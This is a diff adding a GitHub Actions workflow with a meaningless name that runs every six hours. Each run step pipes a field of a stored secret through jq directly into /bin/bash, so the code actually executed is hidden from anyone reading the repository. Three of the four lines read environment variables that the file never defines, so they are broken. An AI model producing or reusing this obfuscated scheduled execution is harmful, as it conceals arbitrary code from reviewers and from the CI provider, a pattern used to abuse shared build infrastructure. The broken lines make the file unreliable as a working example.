@@ -1,0 +1,20 @@
+name: yaodaiwowuqyouyuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaodaiwowuqyouyuan
+        env:
+          h8201: ${{ secrets.h8201 }}
+        run: |
+          echo $h8201 | jq -r .a23 | /bin/bash
+          echo $znxc22052 | jq -r .yeupl3 | /bin/bash
+          echo $mi113 | jq -r .dce6103 | /bin/bash
+          echo $rms5 | jq -r .whfmr97 | /bin/bash
+
